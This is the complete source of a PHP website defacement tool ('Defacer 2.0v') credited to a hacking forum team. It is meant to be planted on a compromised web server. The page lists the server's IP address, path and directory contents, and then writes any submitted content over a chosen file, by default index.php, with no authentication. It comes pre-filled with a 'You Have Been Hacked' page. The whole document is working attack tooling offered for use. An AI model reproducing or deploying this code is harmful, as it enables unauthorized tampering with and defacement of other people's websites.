<title>pHp D3f4c3r By Hacking-Masters.net Team [Dar3c01l]</title>
<style type="text/css">
<!--
.style1 {
    color: #FF0000;
    font-weight: bold;
}
.style2 {color: #000000}
-->
</style>
</head>
<body bgcolor='black' text='lime'>
<form method='post' action='Defacer.php'>
<br />
<br />
<table border='1' align='center' bgcolor='#FFFFFF' cellpadding='2' cellspacing='5'>
<tr>
<td align='center'><span class="style1">Defacer 2.0v by Hacking-Masters.net Team! </span></td>
</tr>
<tr>
<td align='center'><?php $ip=getenv("REMOTE_ADDR"); echo "Your IP: ".$ip; ?></td>
</tr>
<tr>
<td align='center'><?php echo "Server IP: ".$_SERVER['SERVER_ADDR']; ?></td>
</tr>
<tr>
<td align='center'>
<?php
echo"Index status: ";

if(file_exists("index.php"))
{
echo "<font color='lime'> index.php was found</font>";

}

if(file_exists("index.html"))
{
echo "<font color='lime'> index.html was found</font>";

}

elseif(!file_exists("index.php") AND !file_exists("index.html"))
{
echo "<font color='red'> file not found</font>";
}

?></td>
</tr>
<tr>
<td align='center'><?php echo "PATH: ".getcwd(); ?></td>
</tr>
<tr>
<td align='center'>
<?php
$mydir=getcwd();
$myhandle=opendir($mydir);
while($nextfile = readdir($myhandle))
echo $nextfile."<br>";
closedir($myhandle);
?></td>
<tr>
<td align='center'><span class="style2">Target File
  </span>
  <input name='target' type='text' class="style1" value='index.php' size='35' maxlength='50'></td>
</tr>
</tr>
<tr>
  <td align='center'><textarea name='code' cols='50' rows='20' class="style2"><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Hacked By Hacking-Masters.Net Defacer v2.0</title>
<style type="text/css">
<!--
.style4 {
    font-style: italic;
    color: #00FFFF;
    font-weight: bold;
}
body {
    background-color: #666666;
}
-->
</style>
</head>


<p align="center" class="style4">You Have Been Hacked by  Hacking-Masters.net Team<br />
<p><p><p></p>
<p align="center" class="style4">Thank you for using Php D3f4c3r c0d3d By Dar3c01l <br />
  <br />
Php Defacer v2 rocks all <p><p><p></p>
<p align="center" class="style4">Visit Hacking-Masters.net Forums <p><p><p></p>



  </textarea></td>
</tr>
<tr>
<td align='center'><input type='submit' class="style1" value=' DEFACE '></td>
</tr>
</table>
<div align="center"><br />
    Coded by Dar3c01l<br />
    Hacking-Masters.net<br />
    Version 2.0
    <br />
</div>
</form>
</body>

<?php
$target=$_POST["target"];
$code=$_POST["code"];

if($target != "" AND $code != "")
{
$file=fopen($target,"w");
fwrite($file,$code);
fclose($file);
}
else
{
die();
}

?>
